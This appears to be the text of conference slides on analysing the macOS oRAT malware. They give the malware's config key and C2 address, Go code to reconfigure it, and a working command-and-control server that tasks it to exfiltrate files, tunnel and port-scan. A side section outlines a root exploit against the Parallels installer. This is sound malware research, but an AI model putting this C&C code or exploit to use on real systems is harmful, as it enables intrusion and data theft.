@@ -1,0 +1,1026 @@
+Making oRAT
+...Go!
+Want to play along?  
+You can download a sample from: objective-see.org/malware.html
+Config & Proto
+Capabilities
+OUTLINE
+Background
+oRAT
+The approaches, techniques, & tools discussed here, are generically 
+applicable to the analysis of other macOS malware specimens (as well).
+analysis of oRAT
+(custom) C&C
+Background
+"EARTH BERBEROKA" APT
+a new apt group ...with new macOS malware!
+"New APT Group Earth Berberoka Targets  
+Gambling Websites With Old and New Malware" -TrendMicro 
+ 
+"From the Front Lines | Unsigned  
+macOS oRAT Malware Gambles For The Win" -SentinelOne
+New APT group: "Earth Berberoka"
+"...targets gambling websites on 
+Windows, macOS, & Linux platforms 
+using old and new malware families"
+}
+oRAT malware
+focus of our analysis today
+Existing triage(s):
+EXISTING TRIAGES 
+...more of an overview
+Infection vector
+Largely based on static analysis:
+(likely) Capabilities  
+"In my testing scenario, the malware runs the code, but 
+local listening server immediately ends/not starts at all. 
+ 
+Thus in this case, the second part of the analysis was 
+only static (and high-level only)" -oRAT Analyst
+Configuration 
+OUR APPROACH
+(complete) analysis ...via a custom C&C server
+(custom)  
+ C&C server
+tasking (commands)
+checkin...
+}
+results
+Capabilities
+By tasking an infected host (via our custom C&C server) we can 
+passively observe the malware actions, thus revealing its capabilities! 
+result: a comprehensive analysis 
+....without having to fully reverse the sample!
+Monitoring 
+ tools
+PREREQUISITES 
+to task & monitor the malware
+(re)Configuration
+(to talk to *our* C&C server)
+(custom)  
+ C&C server
+Protocol 
+(to know how to task)
+Tools  
+to monitor
+Triage
+to gain a basic understanding
+BASIC TRIAGE
+hashes, file type, code signing, and more
+% file oRat/darwinx64 
+oRat/darwinx64: Mach-O 64-bit executable x86_64
+% md5 oRat/darwinx64 
+9bac717cb7f37a88541c94d09666b960
+% shasum oRat/darwinx64 
+26ccf50a6c120cd7ad6b0d810aca509948c8cd78
+% strings - oRat/darwinx64 
+... 
+ 
+Info: This file is packed with  
+the UPX executable packer http://upx.sf.net  
+Id: UPX 3.96 Copyright (C)  
+1996-2020 the UPX Team. All Rights Reserved.
+oRat: 
+unsigned, packed, 64-bit Mach-O binary
+Hashes
+File type 
+(64-bit Mach-O)
+Unsigned 
+(via WhatsYourSign)
+Embedded strings 
+(...it's packed via UPX)
+UNPACKING
+trivial, via UPX
+% brew install upx 
+% upx -d oRat/darwinx64 -o oRat/darwinx64_UNPACKED 
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+  10334144 <-   3866806   37.42%   macho/amd64   darwinx64_UNPACKED
+Unpacked 1 file. 
+ 
+% du -h darwinx64
+3.7M	 
+% du -h darwinx64_UNPACKED 
+9.9M
+unpack with -d flag 
+almost 10MB :/ 
+Unpacking oRat
+(via UPX) 
+DEPENDENCIES 
+some dynamic ...most though, are static?
+% otool -L oRat/darwinx64_UNPACKED  
+ 
+	 /usr/lib/libSystem.B.dylib 
+	 /System/Library/Frameworks/Security.framework/Versions/A/Security 
+	 /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation
+...very few (dynamic) dependencies 
+% strings - oRat/darwinx64_UNPACKED  
+... 
+github.com/pkg/sftp
+github.com/xtaci/smux
+github.com/gliderlabs/ssh
+github.com/labstack/echo/v4
+github.com/go-resty/resty/v2
+github.com/sevlyar/go-daemon 
+ 
+golang.org/x/net/http2 
+vendor/golang.org/x/crypto/
++ static dependencies?
+}
+networking
+daemonization
+cryptography 
+written in Go ?
+Reversing Go
+...a brief tangent
+RESOURCES
+...on reversing Go
+"Reversing GO binaries like a pro" 
+https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/
+"Reversing Golang Binaries with Ghidra" 
+https://vblocalhost.com/uploads/2021/09/VB2021-04.pdf
+"AlphaGolang | A Step-by-Step Go Malware Reversing Methodology for IDA Pro"  
+https://www.sentinelone.com/labs/alphagolang-a-step-by-step-go-malware-reversing-methodology-for-ida-pro/
+Resources:
+IDENTIFYING GO
+look for a build identifier
+% strings - oRat/darwinx64_UNPACKED  
+... 
+ 
+? Go build ID: "FlbKFSZYPw70PUoFI1...pwP83" 
+function __rt0_amd64_darwin { 
+    
+    return__rt0_amd64(...); 
+ 
+}
+01
+02
+03
+04
+05 
+void __rt0_amd64(...) { 
+     
+   _runtime.rt0_go(...); 
+     
+   return; 
+}
+01
+02
+03
+04 
+05
+06 
+Written in Go?: 
+Binary will contain "Go build ID: <id>"
+oRat contains 
+"Go build ID: <id>"
+Entry point
+Go runtime bootstrap  
+function(s): "rto_go"
+REVERSING GO: CHALLENGES
+large size, with lots of (benign) library code
+Large size
+% GOOS=darwin GOARCH=amd64 go build hello.go 
+% file hello
+Mach-O 64-bit executable x86_64 
+ 
+% du -h hello                      
+1.1M
+package main 
+ 
+func main() { 
+  print("Hello, #OBTS!\n") 
+}
+01
+02
+03
+04 
+05 
+hello.go
+binary: 1M+
+"Due to the approach of statically-linking dependencies, 
+the simplest Go binary is multiple megabytes in size and 
+one with proper functionality can figure in the 15-20mb 
+range." -Juan
+malicious code + dependencies (libraries) 
+...want to identify the latter, and ignore
+reversing tools are confused by "Go strings"
+"Go" Strings: 
+non-null terminated 
+package main 
+ 
+func main() { 
+  print("Hello, #OBTS!\n") 
+}
+01
+02
+03
+04 
+05 
+hello.go
+Disassembly 
+"_go.string.*+3597" 
+x-ref to ...???
+embedded, non-null terminated strings  
+(e.g. "Hello, #OBTS!")
+REVERSING GO: CHALLENGES
+Virtualizing macOS on Apple Silicon
+another brief tangent
+PARALLELS 
+...to virtualize macOS 12 on apple silicon
+macOS 12  
+virtualized on M1
+BUT IS IT SAFE? 
+...(authenticated) installers often are not
+Can a local unprivileged attacker 
+subvert this process to elevate privileges?
+BEHIND THE SCENES 
+...user-owned binaries, run as root ...on r/o mount
+# ./ProcessMonitor 
+{ 
+  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", 
+   "process" : { 
+    "pid" : 7130 
+    "name" : "prl_ls_users", 
+    "path" : "~/Library/Caches/com.parallels.webinstaller/MountPoints/ 
+              3CC0CE4D-04F8-4B04-92A0-5B6672BBC1E5/Parallels Desktop.app/Contents/MacOS/prl_ls_users",
+    "uid" : 0, 
+    ... 
+}
+# ls -lart "~/Library/Caches/com.parallels.webinstaller/MountPoints/ 
+              3CC0CE4D-04F8-4B04-92A0-5B6672BBC1E5/Parallels Desktop.app/Contents/MacOS/prl_ls_users 
+-rwxr-xr-x  1 user  staff
+# mount 
+/dev/disk10s1 on ~/Library/Caches/com.parallels.webinstaller/MountPoints/
+3CC0CE4D-04F8-4B04-92A0-5B6672BBC1E5 (hfs, ... read-only, noowners, nobrowse, mounted by patrick)
+run as root, but from a r/o mount
+process running as root (uid 0)
+owned by user !
+not modifiable? (read-only)
+0DAY EXPLOIT  
+...gaining root via Parallel's installer
+Detect mount of 
+installer disk image 
+Pause installer app
+(signal: SIGSTOP)
+Remount disk image as r/w
+Infect (replace) binary
+Resume installer app
+(signal: SIGCONT)
+subprocess.run(["/usr/bin/hdiutil",  
+  "attach", dmg, "-mountpoint", mountPoint, "-shadow"])
+01
+02
+# whoami  
+root
+woot, root!
+(re)Configuration
+...to connect to our C&C server
+ORAT'S CONFIGURATION
+...encrypted, at end of the the file 
+"The configuration file and the AES decryption key are 
+appended in an encrypted form [to the malware]" -TrendMicro
+Key: A45DE10BAB6F6AE5916FE6C224BCCB61
+Encrypted config
+Size
+% upx -d oRat/darwinx64 --overlay=copy -o oRat/darwinx64_UNPACKED
+Note: even when "--overlay=copy" is specified 
+unpacking will strip (remove) the config overlay from the file!
+ORAT DECRYPTOR 
+...written in Go
+//open malware 
+// from overlay, read size, key, & encrypted config 
+ 
+//init AES (mode: GCM) 
+c, err := aes.NewCipher(key) 
+gcm, err := cipher.NewGCM(c) 
+ 
+//init/extract nonce 
+nonceSize := gcm.NonceSize() 
+nonce, configEncrypted := configEncrypted[:nonceSize], configEncrypted[nonceSize:] 
+ 
+//decrypt 
+configDecrypted, err := gcm.Open(nil, nonce, configEncrypted, nil)
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+13 
+oRat decryptor
+% ./decrypt darwinx64            
+opened: darwinx64 
+extracted key: a45de10bab6f6ae5916fe6c224bccb61
+found encrypted config (size: 0xa6 bytes) 
+decrypted config:  
+{"Local":{"Network":"sudp","Address":":5555"}, 
+ "C2":{"Network":"stcp","Address":"darwin.github.wiki:53"},"Gateway":false}
+Patrick's first Go program ! 
+DECRYPTED CONFIG
+...that includes the addr of the C&C server
+{ 
+ "Local": { 
+   "Network": "sudp", 
+   "Address": ":5555" 
+  }, 
+  "C2": { 
+   "Network": "stcp", 
+   "Address": "darwin.github.wiki:53" 
+  }, 
+  "Gateway": false 
+}
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+}
+Local listener  
+(when Gateway is true)
+}
+C&C server/proto
+Protocol 
+Description
+"tcp"
+plain text TCP
+"stcp"
+encrypted TCP via golang-tls 
+"sudp"
+encrypted UDP via Quic-go library
+Supported protocols  
+(credit: TrendMicro)
+Decrypted configuration
+"Network" key values:
+ORAT ENCRYPTOR 
+...to reconfigure the malware
+{ 
+  "C2": { 
+   "Network": "tcp", 
+   "Address": "192.168.0.10:1337" 
+  } 
+  ... 
+}
+01
+02
+03
+04 
+05
+06
+07
+}
+192.168.0.10:1337 
+...our C&C server
+(custom)  
+ C&C server
+key, err := hex.DecodeString("A45DE10BAB6F6AE5916FE6C224BCCB61") 
+config := []byte("{\"Local\":{\"Network\":\"sudp\",\"Address\":\":5555\"}, 
+          \"C2\":{\"Network\":\"tcp\",\"Address\":\"192.168.0.10:1337\"},\"Gateway\":false}") 
+ 
+//init cipher 
+c, err := aes.NewCipher(key) 
+gcm, err := cipher.NewGCM(c) 
+ 
+//init nonce 
+nonce := make([]byte, gcm.NonceSize()) 
+io.ReadFull(rand.Reader, nonce) 
+ 
+//encrypt 
+cipherText := gcm.Seal(nonce, nonce, config, nil) 
+ 
+//write out: encrypted config + key + size
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+13 
+14 
+15 
+16
+new config
+New config
+ORAT ENCRYPTOR 
+...to reconfigure the malware
+{ 
+ "C2": { 
+  "Network": "tcp", 
+  "Address": "192.168.0.10:1337" 
+ } 
+ ... 
+}
+01
+02
+03
+04 
+05
+06
+07
+% nc -l 1337  
+                                                                        
+? POST /join HTTP/1.1
+Host: localhost
+User-Agent: requests
+Content-Length: 10
+Content-Type: application/json
+Accept-Encoding: gzip
+{"type":0}                       
+% hexdump -C darwinx64 
+... 
+009da570  74 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |te..............| 
+009da580  0c 42 55 f6 39 ba 23 a3  db 7a 4d 05 1e 89 f2 d8  |.BU?9?#??zM...??| 
+009da590  3d d4 ba e3 60 fb 46 ce  e4 cc ac 42 c4 85 26 e8  |=?????`?F??̬B?.&?| 
+009da5a0  48 02 d6 99 70 fd 19 a6  8a e9 24 bd 04 c7 6d 56  |H.?.p?.?.?$?.?mV| 
+009da5b0  b0 64 a8 28 24 cb d3 c0  14 dd cc 86 70 df 6b 63  |?d?($???.??.p?kc| 
+... 
+009da5f0  19 9b 62 6b 06 6c 73 a2  fa f3 55 1a d6 6a 48 03  |..bk.ls???U.?jH.| 
+009da600  74 ce 71 85 6f 99 69 bc  ba 9f 31 2b 17 94 f2 a4  |t?q.o.i??.1+..??| 
+009da610  5d e1 0b ab 6f 6a e5 91  6f e6 c2 24 bc cb 61 a1  |]?.?oj?.o??$??a?| 
+009da620  00                                                |.|                
+oRat, reconfigured
+Success, a connection!
+new config (encrypted)
+check-in (from malware)
+ANOTHER WAY TO (RE)CONFIGURE?
+...yes, via various RK_* environment variables 
+Env. Var.
+Description
+"RK_NET"
+Protocol (tcp, stcp, sudp) 
+"RK_ADDR"
+Address and port of C&C server
+"RK_DEBUG"
+Flag for debug messages (and to prevent daemonization)
+oRat's Environment 
+Variables
+0x00000000014aebcf     lea      rax, qword [RK_ADDR] 
+0x00000000014aebd6     mov      qword [rsp], rax 
+0x00000000014aebda     mov      qword [rsp+0x8], 0x7 
+0x00000000014aebe3     call     os.Getenv
+01
+02
+03
+04
+get value of "RK_ADDR"
+Querying environment vars
+(e.g. "RK_ADDR")
+ANOTHER WAY TO (RE)CONFIGURE?
+...yes, via various RK_* environment variables 
+% export RK_NET=tcp
+% export RK_ADDR=192.168.0.10:666
+ 
+% lldb darwinx64  
+...
+Process 3205 stopped
+darwinx64`main.main:
+->  0x14aeaef <+591>: callq  0x14a9da0  ; orat/cmd/agent/app.(*App).Run                     
+ 
+(lldb) x/x $rsp
+0xc00006bee8: 0x000000c0000ee000
+(lldb) x/4gx  0x000000c0000ee000
+0xc0000ee000: 0x000000c000022067 0x0000000000000003
+0xc0000ee010: 0x000000c000026088 0x0000000000000010
+ 
+(lldb) x/s 0x000000c000022067
+0xc000022067: "tcp"
+ 
+(lldb) x/s 0x000000c000026088
+0xc000026088: "192.168.0.10:666"
+value of "RK_NET"
+value of "RK_ADDR"
+}
+Protocol
+...to talk to *our* C&C server
+COMMUNICATIONS VIA SMUX
+...a multiplex library
+% nc -l 1337  
+ 
+                                                                                                  
+? POST /join HTTP/1.1
+Host: localhost
+User-Agent: requests
+Content-Length: 10
+Content-Type: application/json
+Accept-Encoding: gzip
+{"type":0}
+hrmmm, not plain HTTP
+"Smux (Simple MUltipleXing) is a multiplexing library for Golang.  
+ 
+It relies on an underlying connection ...and provides stream-
+oriented multiplexing" -github.com/xtaci/smux 
+Disassembly
+Slightly strange 
+traffic...
+"xtaci/smux" library
+MUX'ING
+...malware's comms routed thru single connection
+}
+}
+Efficient
+heartbeat, C&C tasking,  
+mux'd over one connection
+(somewhat) Stealthy
+oRat's mux'd connection to C&C server 
+Mux'ing
+}
+Need a "mux-
+aware" C&C
+CREATING AN ORAT C&C SERVER 
+  install xtaci/smux package
+package main 
+import (
+	 ...
+	 "net"
+	 "github.com/xtaci/smux"
+)
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+%  go install github.com/xtaci/smux 
+Q: How do you install Go packages? 
+A: Via go install <package>
+how Patrick learns Go
+then, add import
+CREATING AN ORAT C&C SERVER 
+  listen and accept connections
+func server(port string) { 
+  
+ //listen on specified port 
+ listener, err := net.Listen("tcp", "0.0.0.0" + ":" + port) 
+  
+ //accept connection 
+ // invoke function to handle  
+ for { 
+        conn, err := listener.Accept() 
+ 
+        go handleConnection(conn) 
+ }
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+% GOOS=darwin GOARCH=amd64 go build 
+% ./server 1337                    
+Launching oRat C&C Server...
+[+] Listening on port: 1337
+[+] New client connection: 192.168.0.27:54784 1337
+Listen
+Accept connection
+Handle connection
+A connection
+CREATING AN ORAT C&C SERVER 
+  init mux server and accept stream  
+func handleConnection(conn net.Conn) { 
+ 
+    //init mux session  
+    session, err := smux.Server(conn, nil) 
+     
+    //accept stream 
+    stream, err := session.AcceptStream() 
+ 
+    fmt.Println("Accepted stream w/ flow id: ", stream.ID()) 
+ 
+    //handle stream  
+    go handleStream(stream, session) 
+}
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+13
+% ./server 1337                    
+Launching oRat C&C Server...
+[+] Listening on port: 1337
+[+] New client connection: 192.168.0.27:54784 1337 
+ 
+[+] Accepted stream w/ flow id: 3
+ 
+POST /join HTTP/1.1
+...
+{"type":0}
+Init mux server 
+Accept mux stream 
+...handle the stream
+Check-in
+ORAT PROTOCOL 
+...tasking, handled via "routes"
+"The [local] control server is implemented by registering routes.  
+ 
+This simple mechanism leads to translating GET/POST requests 
+directly as internal Go commands. Requesting a URL therefore 
+results in executing the corresponding code on an infected system." 
+-TrendMicro
+Register Routes: 
+ request → handlers
+Process requests
+(lookup handler for request and invoke it)
+Request:  
+"GET <some/request>"
+ORAT'S REGISTERED ROUTES
+via labstack's echo server (v4.0)
+int orat/cmd/agent/app.(*App).registerRouters(...) 
+ 
+0x00000000014aa691   mov    rax, qword [rsp+0x8] 
+0x00000000014aa696   lea    rcx, qword [_orat/cmd/agent/app.(*App).Info-fm] 
+0x00000000014aa69d   mov    qword [rax], rcx 
+... 
+ 
+0x00000000014aa6d6   lea    rdx, qword [GET]                          
+0x00000000014aa6dd   mov    qword [rsp+0x18], rdx  
+... 
+ 
+0x00000000014aa6eb   lea    rbx, qword [AGENT_INFO] 
+0x00000000014aa6f2   mov    qword [rsp+0x28], rbx 
+... 
+ 
+0x00000000014aa713   call   _github.com/labstack/echo/v4.(*Echo).add
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+13
+14
+15
+16
+Specify route handler
+Specify route request verb
+Specify route request
+server: labstack's echo server 
+(a "high perf. minimalist Go web framework")
+Register ("install") route 
+...in action, via *Router.Find, then invocation
+ORAT'S REGISTERED ROUTES
+% lldb darwinx64  
+...
+Process 3205 stopped
+* thread #1, stop reason = breakpoint 1.1
+    frame #0: 0x000000000131f9e0 darwinx64`github.com/labstack/echo/v4.(*Router).Find 
+darwinx64`github.com/labstack/echo/v4.(*Router).Find:
+->  0x131f9e0 <+0>:  movq   %gs:0x30, %rcx
+(lldb) backtrace 
+* thread #1, stop reason = breakpoint 6.1
+  * frame #0: 0x000000000131f9e0 darwinx64`github.com/labstack/echo/v4.(*Router).Find
+    frame #1: 0x000000000131bbeb darwinx64`github.com/labstack/echo/v4.(*Echo).ServeHTTP + 299
+    frame #2: 0x00000000012d9743 darwinx64`net/http.serverHandler.ServeHTTP + 163
+    frame #3: 0x00000000012d5e8d darwinx64`net/http.(*conn).serve + 2221
+(lldb) continue 
+Process 3205 stopped
+* thread #1, stop reason = breakpoint 2.1
+    frame #0: 0x00000000014ad2e0 darwinx64`orat/cmd/agent/app.(*App).Info-fm
+ 
+darwinx64`orat/cmd/agent/app.(*App).Info-fm:
+->  0x14ad2e0 <+0>:  movq   %gs:0x30, %rcx
+lookup (find) handler  
+based on route request
+invoke the handler 
+ORAT'S ROUTES
+"commands" taskable from a remote c&c server
+Request
+Verb
+Handler Name
+/agent/info
+GET
+orat/cmd/agent/app.(*App).Info-fm
+/agent/ping
+GET
+orat/cmd/agent/app.(*App).Ping-fm
+/agent/upload
+POST
+orat/cmd/agent/app.(*App).UploadFile-fm
+/agent/download
+GET
+orat/cmd/agent/app.(*App).DownloadFile-fm
+/agent/screenshot
+GET
+orat/cmd/agent/app.(*App).Screenshot-fm
+/agent/zip
+GET
+orat/cmd/agent/app.(*App).Zip-fm
+/agent/unzip
+GET
+orat/cmd/agent/app.(*App).Unzip-fm
+/agent/kill-self
+GET
+orat/cmd/agent/app.(*App).KillSelf-fm
+/agent/portscan
+GET
+orat/cmd/agent/app.(*App).PortScan-fm
+/agent/proxy
+GET
+orat/cmd/agent/app.(*App).NewProxyConn-fm
+/agent/ssh
+GET
+orat/cmd/agent/app.(*App).NewShellConn-fm
+/agent/net
+GET
+orat/cmd/agent/app.(*App).NewNetConn-fm
+oRat's registered routes
+extracted from: app.(*App).registerRouters 
+ORAT'S REGISTERED ROUTES
+and what about parameters (arguments)? 
+orat/cmd/agent/app.(*App).PortScan 
+ 
+ 0x00000000014abeca    lea    rbx, qword [HOST_STR]     ; string: "Host" 
+ 0x00000000014abed1    mov    qword [rsp+0x8], rbx 
+ 0x00000000014abed6    mov    qword [rsp+0x10], 0x4 
+ 0x00000000014abedf    nop 
+ 0x00000000014abee0    call   rcx                       ; echo/v4.(*context).QueryParam() 
+ ... 
+ 0x00000000014abf11    lea    rdi, qword [PORT_STR]     ; string: "Port" 
+ 0x00000000014abf18    mov    qword [rsp+0x8], rdi 
+ 0x00000000014abf1d    mov    qword [rsp+0x10], 0x4 
+ 0x00000000014abf26    call   rbx                       ; echo/v4.(*context).QueryParam() 
+ ...
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+13
+Request:  
+"GET /agent/portscan?Host=<host>&Port=<ports>..."
+Expected parameters 
+(found via disassembly)
+Tasking oRat
+...to confirm its capabilities
+TASKING
+...but how?
+% lldb darwinx64  
+...
+Process 3205 stopped 
+ 
+* thread #1, stop reason = breakpoint 7.1
+darwinx64`github.com/labstack/echo/v4.(*Echo).StartServer:
+->  0x131bde0 <+0>:  movq   %gs:0x30, %rcx
+(lldb) backtrace
+* thread #1, stop reason = breakpoint 7.1
+  * frame #0: 0x000000000131bde0 darwinx64`github.com/labstack/echo/v4.(*Echo).StartServer
+    frame #1: 0x00000000014aa0df darwinx64`orat/cmd/agent/app.(*App).Serve + 255
+    frame #2: 0x00000000014ac9bf darwinx64`orat/cmd/agent/app.(*App).run.func1 + 63 
+ 
+(lldb) continue
+call echo server's StartServer 
+...but no listening socket!?
+Listening sockets 
+(none!?)
+TASKING
+via a (mux'd) stream!
+session, _ := smux.Server(conn, nil) 
+stream,  _ := session.AcceptStream()        
+... 
+ 
+ 
+func StreamHandler(stream *smux.Stream, session *smux.Session) { 
+ 
+ taskingStream, _ := session.OpenStream() 
+  
+ taskingStream.Write([]byte("GET /agent/info HTTP/1.1\r\nHost:foo.com\r\n\r\n")) 
+ 
+ n, _ = taskingStream.Read(buffer) 
+ fmt.Println(fmt.Sprintf("%s", buffer[:n])) 
+01
+02
+03
+04 
+05
+06
+07
+08
+09
+10
+11
+12
+13
+Open stream  
+(on existing session)
+Read from stream, to receive response
+Task, by writing to stream
+Tasking
+...in 3 easy steps !
+C&C server, using smux library
+TASKING
+survey (via /agent/info)
+% ./server 1337                     
+Launching oRat C&C Server...
+[+] Listening on port: 1337
+[+] New client connection: 192.168.0.27:54784 1337 
+ 
+[+] Accepted stream w/ flow id: 3
+POST /join HTTP/1.1
+...
+{"type":0}
+[+] Sending: GET /agent/info
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8 
+...
+{
+  "OS": "darwin",
+  "Arch": "amd64",
+  "Hostname": "users-Mac.local",
+  "Username": "user",
+  "RemoteAddr": "",
+  "Version": "v0.5.1",
+  "JoinTime": "0001-01-01T00:00:00Z"
+}
+task
+hooray, a response !  
+...info about (infected) host
+TASKING
+exfil (via GET /agent/download?file=<path 2 file>)
+% ./server 1337                     
+Launching oRat C&C Server...
+[+] New client connection: 192.168.0.27:54784 1337 
+[+] Sending: GET /agent/download?file=/Users/user/Desktop/exfil.txt
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 12
+Content-Type: text/plain; charset=utf-8
+Last-Modified: Tue, 06 Sep 2022 00:34:26 GMT
+Hello, #OBTS! 
+task
+response: file's contents
+# ./FileMonitor -filter darwinx64 
+{ 
+  "event" : "ES_EVENT_TYPE_NOTIFY_OPEN", 
+  "file" : { 
+    "destination" : "/Users/user/Desktop/exfil.txt", 
+    "process" : { 
+      "pid" : 3644     
+      "path" : "/Users/user/Desktop/darwinx64", 
+    } 
+   ...
+File Monitor  
+(on infected system)
+Route: /agent/download
+TASKING
+screenshot (via GET /agent/screenshot)
+% ./server 1337                     
+Launching oRat C&C Server...
+[+] New client connection: 192.168.0.27:54784 1337 
+ 
+[+] Sending: GET /agent/screenshot
+HTTP/1.1 400 Bad Request
+Content-Type: text/plain; charset=UTF-8
+Date: Tue, 06 Sep 2022 00:32:42 GMT
+Content-Length: 22
+does not support macOS
+task
+response: not implemented (on macOS)
+Route: /agent/screenshot 
+(unsupported)
+TASKING
+tunnel (via GET /agent/net)
+% ./server 666                     
+Launching oRat C&C Server...
+[+] New client connection: 192.168.0.27:54784 666 
+[+] Sending: GET /agent/net?Host=192.168.0.11&Port=1234&Network=tcp&Timeout=100
+connected.
+[+] Sending "Knock Knock"
+[+] Received: "Who's There?"
+task
+% ifconfig en0 
+192.168.0.11 
+% nc -l 1234
+Knock Knock
+Who's There?
+"Knock Knock"
+"Who's There?"
+Tunnel endpoint
+Route: /agent/net
+tunnel communications 
+TASKING
+port scan (via /agent/portscan)
+% ./server 1337                     
+Launching oRat C&C Server...
+[+] New client connection: 192.168.0.27:54784 1337 
+[+] Sending: /agent/portscan?Host=192.168.0.10&Port=1000-2000&Thread=1&Timeout=100 
+ 
+Start.
+Open: 192.168.0.10:1234
+Done.
+Port Scan (via WireShark) 
+Route: /agent/portscan
+task
+response: port scan results
+is port (1234) open?
+TASKING
+self-delete (via /agent/kill-self)
+% ./server 666                     
+Launching oRat C&C Server...
+[+] New client connection: 192.168.0.27:54784 666 
+[+] Sending: GET /agent/kill-self 
+ 
+Client disconnected , Destruction session , Peer address: 192.168.0.27:56075
+# ./FileMonitor -filter darwinx64 
+{
+  "event" : "ES_EVENT_TYPE_NOTIFY_UNLINK",
+  "file" : {
+    "destination" : "/Users/user/Desktop/darwinx64",
+    "process" : { 
+      "pid" : 3644     
+      "path" : "/Users/user/Desktop/darwinx64", 
+    } 
+   ...
+# ./ProcessMonitor 
+{
+  "event" : "ES_EVENT_TYPE_NOTIFY_EXIT",
+   "process" : { 
+      "pid" : 3644     
+      "path" : "/Users/user/Desktop/darwinx64", 
+      ... 
+      "exit code" : 0 
+    } 
+   ...
+task
+client disconnect
+Self delete
+Terminate
+Route: /agent/kill-self
+Conclusions
+...& take aways
+TAKEAWAYS 
+Studying an APT's macOS tools, provide insights into the 
+Apple-specific approaches employed by advanced adversaries.
+Via a custom command and control server one can  
+efficiently understand the capabilities of complex malware!
+...and now you have a (re)configurable malware, and a 
+compatible command and control server. Go play? 
+MAHALO!
+"Friends of Objective-See" 
+Guardian Mobile Firewall
+SmugMug
+iVerify
+Halo Privacy
+RESOURCES:
+Making oRAT Go
+"New APT Group Earth Berberoka Targets Gambling Websites With Old and New Malware"  
+https://www.trendmicro.com/en_us/research/22/d/ 
+ new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html 
+ 
+"From the Front Lines | Unsigned macOS oRAT Malware Gambles For The Win" 
+https://www.sentinelone.com/blog/from-the-front-lines-unsigned-macos-orat-malware-gambles-for-the-win/ 
+ 
+"Reversing GO binaries like a pro" 
+https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/ 
+ 
+"AlphaGolang | A Step-by-Step Go Malware Reversing Methodology for IDA Pro"  
+https://www.sentinelone.com/labs/alphagolang-a-step-by-step-go-malware-reversing-methodology-for-ida-pro/
